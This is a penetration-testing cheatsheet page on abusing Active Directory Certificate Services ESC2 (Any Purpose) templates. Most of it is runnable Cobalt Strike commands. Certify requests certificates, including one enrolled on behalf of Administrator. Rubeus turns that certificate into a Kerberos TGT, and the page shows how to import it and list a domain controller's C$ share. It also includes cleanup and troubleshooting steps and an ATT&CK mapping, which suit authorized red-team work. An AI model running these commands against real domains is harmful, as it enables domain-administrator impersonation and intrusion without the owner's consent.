---
title: "AD CS ESC2 \u00b7 Any Purpose Templates"
description: "Assess Any Purpose or unrestricted certificate usages, then validate whether the issued certificate can support an enrollment-agent or requester-controlled identity path."
category: "AD CS"
tools: ["Cobalt Strike", "Certify", "Rubeus", "Kerbeus BOF"]
updated: "2026-11-16"
tags: ["adcs", "esc2"]
draft: false
---

## 1. Why the configuration matters

ESC2 describes templates that issue certificates with Any Purpose or no EKU restriction. Broad certificate usage can enable unintended authentication or enrollment-agent use when the consuming service and CA accept it.

**Broad usage does not automatically grant another user's identity.** If the subject is built from AD, the certificate initially represents the requesting account. Further impersonation needs an accepting on-behalf-of enrollment path, or separate identity control such as ESC1.

## 2. Enumerate and obtain the certificate

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
# Inspect ESC2: Any Purpose, publication, enrollment, approval and signatures.
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC2 --quiet
# Retain this requesting-account PFX separately from any later target PFX.
```

## 3. Validate the enrollment-agent path

The notes route this case through ESC3. The target template must accept the agent certificate and permit the requested on-behalf-of enrollment. Agent restrictions and template policy remain relevant.

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx <ESC2_PFX_BASE64> --quiet
# Continue only if an Administrator certificate is actually issued.
```

If requester-controlled SAN is also present, assess the separate [ESC1 path](/cheatsheets/adcs-esc1-cheatsheet/). Do not assume that Any Purpose alone provides it.

## Authenticate with the certificate

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:<TARGET_PFX_BASE64> /enctype:aes256 /nowrap
# Retain the returned TGT; this command does not import it.
```

The PFX must contain the private key. Verify certificate trust, validity, authentication usage, revocation availability and account mapping. An issued PFX does not prove that the KDC will accept it as the requested identity.

## Import and verify the TGT

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<TGT_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
```

Confirm the ticket client is `Administrator` and its service is `krbtgt/CONTOSO.COM`. Select one import path. Then verify an operation that the represented account is authorized to perform.

```shell
beacon> ls \\lon-dc-1\c$
```

## Session cleanup

```shell
beacon> krb_purge
beacon> rev2self
# Rubeus createnetonly path only:
beacon> kill <CREATED_PID>
```

Purging a ticket cache does not revoke the certificate. Record the issued request IDs and certificate serials for revocation through the CA when required.

## Troubleshooting

| Symptom | Check |
|---|---|
| Agent request rejected | Whether the broad-usage certificate is accepted for agent signing, CA restrictions and target template policy |
| PKINIT fails | PFX includes its private key, PFX password if set, DC certificate/PKINIT support, clock and account mapping |
| Ticket imports but access is denied | Actual client identity, selected session, SPN and resource permissions |

## Quick checklist

```text
[ ] Confirm Any Purpose or absent EKU restrictions and actual enrollment rights.
[ ] Request a certificate for the current account using ESC2.
[ ] Validate agent restrictions and an accepting target template.
[ ] Use request-agent only if supported by those policies.
[ ] Retain the final target-account PFX separately from the initial agent PFX.

AUTHENTICATE AND VERIFY
[ ] Obtain the final PFX with its private key; verify the intended identity.
[ ] Rubeus asktgt /certificate:<PFX_BASE64> -> retain the returned TGT.
# Rubeus Alternative
[ ] createnetonly /ticket:<TGT_BASE64> -> record PID, then steal_token <CREATED_PID>.
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
[ ] run klist -> verify client, realm, service and expiration.
[ ] Test actual resource authorization for this identity.

CLEANUP
[ ] Purge only the disposable session, then rev2self.
[ ] Kill only the process created by the Rubeus alternative.
[ ] Remove exported private-key material when no longer needed; handle certificate revocation separately.
```

## MITRE ATT&CK

| Behavior in this guide | ATT&CK reference |
|---|---|
| Abusing certificates for authentication | [T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |

## Related references

- [ESC3 enrollment agents](/cheatsheets/adcs-esc3-cheatsheet/)
- [AD CS enumeration](/cheatsheets/adcs-enumeration-cheatsheet/)
- [Certify](https://github.com/GhostPack/Certify)
- [Rubeus](https://github.com/GhostPack/Rubeus)
